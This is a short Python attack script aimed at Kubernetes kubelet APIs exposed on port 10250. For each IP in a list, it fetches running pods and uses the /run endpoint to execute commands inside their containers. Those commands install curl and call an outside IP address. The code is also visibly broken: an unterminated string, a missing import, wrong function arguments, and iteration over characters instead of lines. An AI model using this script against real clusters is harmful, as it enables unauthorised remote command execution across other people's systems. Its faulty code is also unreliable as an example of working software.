import requests
import json
import sys


def run_cmd(ip, namespace, name, container_name, cmd):
    req = requests.post(f"https://{ip}:10250/run/{namespace}/{name}/{container_name}?cmd={cmd})
    if req.status_code == 200:
        print("Ran successfully, here's the output")
        print(req.text)
    else:
        print("Something went wrong")
        print(req.text)
    time.sleep(5)

# read file from stdin
ip_file = open(sys.argv[1], 'r').read()
for i in ip_file:
    # try to find running pods
    pods = requests.get(f"https://{i}:10250/runningpods/")
    if pods.status_code == 200:
        resp = pods.json()
        for i in resp['items']:
            name = i['name']
            namespace = i['namespace']
            container_name = i['spec']['containers'][0]['name']
            # execute same thing in them
            run_cmd("/bin/apt-get update")
            run_cmd("/bin/apt-get install -y curl")
            run_cmd("/bin/curl -v http://205.134.240.43:8001/")
